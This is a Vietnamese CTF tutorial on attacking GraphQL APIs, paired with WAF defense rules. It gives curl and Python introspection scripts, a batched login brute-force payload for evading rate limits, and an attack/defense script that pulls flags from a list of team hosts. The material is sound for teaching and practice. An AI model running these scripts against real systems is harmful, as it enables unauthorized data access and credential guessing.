Web CTF · GraphQL Security

GraphQL — Khai thác cơ bản

GraphQL là 1 cách thiết kế API khác REST: thay vì nhiều endpoint cố định (/users/1, /posts/2...), toàn bộ ứng dụng chỉ có 1 endpoint duy nhất (thường /graphql), và CLIENT tự chọn muốn lấy trường dữ liệu nào trong 1 request. Sức mạnh này cũng là nguồn gốc nhiều lỗ hổng: lộ toàn bộ "bản đồ API" qua introspection, bypass access control vì 1 field quên check quyền, và DoS vì query lồng nhau không giới hạn.

00 / TÓM TẮT 1 PHÚT

GraphQL khác REST thế nào, và lỗ hổng nằm ở đâu

Mọi request GraphQL (gần như luôn) là POST tới 1 URL duy nhất (/graphql), body dạng JSON có khoá "query" chứa cú pháp truy vấn riêng của GraphQL. 3 lỗ hổng hay gặp nhất: (1) Introspection bật — bất kỳ ai cũng hỏi được "API này có những field/type nào" → lộ toàn bộ sơ đồ dữ liệu kể cả field không công khai trên UI; (2) Broken Access Control theo field — field/mutation lẻ quên check quyền dù endpoint chung có auth; (3) Batching/Nested query — gửi hàng trăm query/mutation trong 1 request để bypass rate-limit hoặc brute-force.

Nếu chỉ nhớ một điều Việc đầu tiên luôn làm với bất kỳ endpoint GraphQL nào: thử introspection query (mục 06.A) — nếu thành công, bạn có ngay "bản đồ" toàn bộ API để tìm field nhạy cảm, không cần đoán mò.
⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay
⚡ GRAPHQL
🚩 Nhận ra trong 30 giây Có request POST tới /graphql hoặc /api/graphql với body JSON chứa {"query": "..."} ⟹ chắc chắn 100% là GraphQL.
✅ Tiền đề cần có Không cần gì đặc biệt — chỉ cần biết đúng URL endpoint (thử cả /graphql, /api/graphql, /v1/graphql nếu không bắt được request mẫu).
🔍 Dò nhanh Gửi introspection query (mục 06.A) — nếu response trả về JSON đầy field __schema, types... ⟹ introspection đang MỞ, khai thác được ngay.
💥 Payload dán-chạy-ngay (introspection) 
curl -s -X POST http://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name}}}}"}' | python3 -m json.tool
🐍 Script khai thác (điền host, chạy) 
import requests

INTROSPECTION = '{__schema{types{name,fields{name,args{name}}}}}'
r = requests.post("http://TARGET/graphql", json={"query": INTROSPECTION})
for t in r.json()["data"]["__schema"]["types"]:
    if t["fields"]:
        print(t["name"], [f["name"] for f in t["fields"]])
⚠️ Gotcha + 🛡️ WAF 1 dòng Nếu introspection bị tắt (production chuẩn thường tắt), dùng công cụ clairvoyance (mục 07) để "đoán lại" field name qua thông báo lỗi gợi ý ("Did you mean..."). WAF rule nhanh: chặn query có chứa __schema hoặc __type trong body JSON field query — chính là cách tắt introspection ở tầng mạng khi chưa sửa được code.
01 / NỀN TẢNG BẮT BUỘC

Những thứ cần hiểu trước

Query — yêu cầu ĐỌC dữ liệu (tương đương GET trong REST), bạn tự chọn field muốn lấy.
Mutation — yêu cầu THAY ĐỔI dữ liệu (tương đương POST/PUT/DELETE trong REST): tạo, sửa, xoá.
Schema — "bản thiết kế" toàn bộ API: định nghĩa có những Type (kiểu dữ liệu) nào, mỗi Type có field gì, mỗi field nhận tham số (argument) gì.
Introspection — tính năng TỰ MÔ TẢ của GraphQL: gửi 1 query đặc biệt ({__schema{...}}) để API tự trả về toàn bộ schema của chính nó — rất tiện cho dev (tool tự sinh doc/autocomplete), nhưng nếu không tắt ở production, kẻ tấn công cũng dùng được để xem toàn bộ "bản đồ" API.

Ví dụ 1 query và response tương ứng:

// Request (POST /graphql, Content-Type: application/json)
{"query": "{ user(id: 1) { name email } }"}

// Response
{"data": {"user": {"name": "alice", "email": "alice@example.com"}}}
02 / VÌ SAO LỖ HỔNG TỒN TẠI

Linh hoạt cho dev = dễ sót cho security

GraphQL cố ý thiết kế rất linh hoạt: 1 endpoint, client tự chọn field, dễ mở rộng thêm type/field mới. Hệ quả: (1) dev thường QUÊN TẮT introspection khi deploy production (mặc định của nhiều framework là MỞ); (2) access control phải được check Ở TỪNG FIELD/RESOLVER riêng lẻ (không có khái niệm "route" chung để áp middleware 1 lần như REST) — rất dễ sót 1 field; (3) không có giới hạn tự nhiên về độ sâu/độ phức tạp của query — client có thể gửi query lồng 50 cấp, gây tải cực lớn cho server (DoS).

06 / PAYLOAD CATALOG

3 payload nền tảng

A. Introspection đầy đủ

{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } } } fragment FullType on __Type { name fields { name args { name type { name } } type { name } } } "}
Phiên bản RÚT GỌN nhanh để test trước (nếu thành công mới chạy bản đầy đủ): {"query":"{__schema{types{name}}}"}
Response thành công trả JSON với data.__schema.types là danh sách toàn bộ Type trong hệ thống.

B. Dò field nhạy cảm sau khi có schema

{"query": "{ user(id: 1) { name email isAdmin internalNotes } }"}

Thử thêm field bất kỳ tên trong schema vào — nếu field đó tồn tại nhưng app không che với user thường, bạn thấy ngay dữ liệu (vd internalNotes lẽ ra chỉ admin xem được).

C. Batching — gửi nhiều query trong 1 request (bypass rate-limit)

[
  {"query": "{ login(user:\"admin\", pass:\"guess1\") { token } }"},
  {"query": "{ login(user:\"admin\", pass:\"guess2\") { token } }"},
  {"query": "{ login(user:\"admin\", pass:\"guess3\") { token } }"}
]

Nhiều server GraphQL hỗ trợ gửi 1 ARRAY query trong 1 request HTTP — rate-limit đếm theo SỐ REQUEST HTTP sẽ chỉ tính đây là 1 request, dù thực chất có 3 lần thử đăng nhập. Rất hiệu quả để brute-force mà không chạm giới hạn 30 submissions/phút của giải (lưu ý: chỉ dùng kỹ thuật này hợp lệ trong phạm vi A/D được phép, không phải cách lách luật nộp flag).

08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)

Từ tay-gõ-Burp sang script tự động

(A) Bản thủ công — để HIỂU từng bước

import requests

URL = "http://TARGET/graphql"

# Bước 1: introspection rút gọn, kiểm tra có mở không
r = requests.post(URL, json={"query": "{__schema{types{name}}}"})
print(r.json())

# Bước 2: nếu có type "User", thử lấy field nhạy cảm
r = requests.post(URL, json={"query": '{ user(id: 1) { name email isAdmin } }'})
print(r.json())

(B) Bản gọn chắc — tự quét toàn bộ type/field, tìm field "nhạy cảm" theo từ khoá

import re, requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")
SENSITIVE_WORDS = ["admin", "secret", "flag", "internal", "token", "password"]

def get_schema(url):
    q = "{__schema{types{name fields{name}}}}"
    r = requests.post(url, json={"query": q}, timeout=5)
    return r.json().get("data", {}).get("__schema", {}).get("types", [])

def find_sensitive_fields(url):
    hits = []
    for t in get_schema(url):
        for f in (t.get("fields") or []):
            if any(w in f["name"].lower() for w in SENSITIVE_WORDS):
                hits.append((t["name"], f["name"]))
    return hits

print(find_sensitive_fields("http://TARGET/graphql"))

(C) Bản A/D tái dùng — query khai thác cố định (sau khi đã tìm field đúng 1 lần)

import re, requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")
# Điền field đúng sau khi đã dò bằng bản (B) 1 lần trên service mẫu
EXPLOIT_QUERY = '{ adminPanel { flag } }'

def exploit_graphql(host):
    try:
        r = requests.post(f"http://{host}/graphql", json={"query": EXPLOIT_QUERY}, timeout=5)
        m = FLAG_RE.search(r.text)
        return m.group() if m else None
    except requests.RequestException:
        return None

if __name__ == "__main__":
    for host in open("teams.txt").read().split():
        flag = exploit_graphql(host)
        if flag:
            print(f"{host} {flag}")
            with open("flags.txt", "a") as f:
                f.write(f"{flag}\n")

10 / PHÒNG THỦ: VIẾT WAF RULE

Chặn đúng payload, không chặn nhầm request thường

Rule (trên body JSON field "query")Khớp gì
__schema|__type\bIntrospection query — nếu app KHÔNG cần introspection ở production, chặn an toàn, false positive gần như 0
Body là JSON ARRAY (bắt đầu bằng [) gửi tới endpoint GraphQLBatching — nhiều app hợp lệ không cần batching, có thể chặn nếu app không dùng tính năng này
Giới hạn thực tếBroken Access Control theo field (mục 09) KHÔNG có dấu hiệu bất thường nào trong chính câu query — field đó về CÚ PHÁP hoàn toàn hợp lệ và giống mọi field khác. WAF không thể phân biệt được "field hợp lệ do user thường gọi" với "field hợp lệ nhưng chỉ admin được gọi" — đây là lỗi PHẢI fix ở code (thêm check quyền đúng ở resolver), không có cách chặn ở tầng mạng.

12 / NHẬN DIỆN & GIỚI HẠN

Khi nào ĐƯỢC / KHÔNG dùng

Tình huống
✅App có endpoint GraphQL thật (xác nhận bằng body {"query": ...} tới 1 URL duy nhất).
❌App REST thông thường nhưng tên endpoint tình cờ chứa "graphql" (hiếm, nhưng luôn xác nhận lại bằng introspection trước khi đầu tư thời gian).
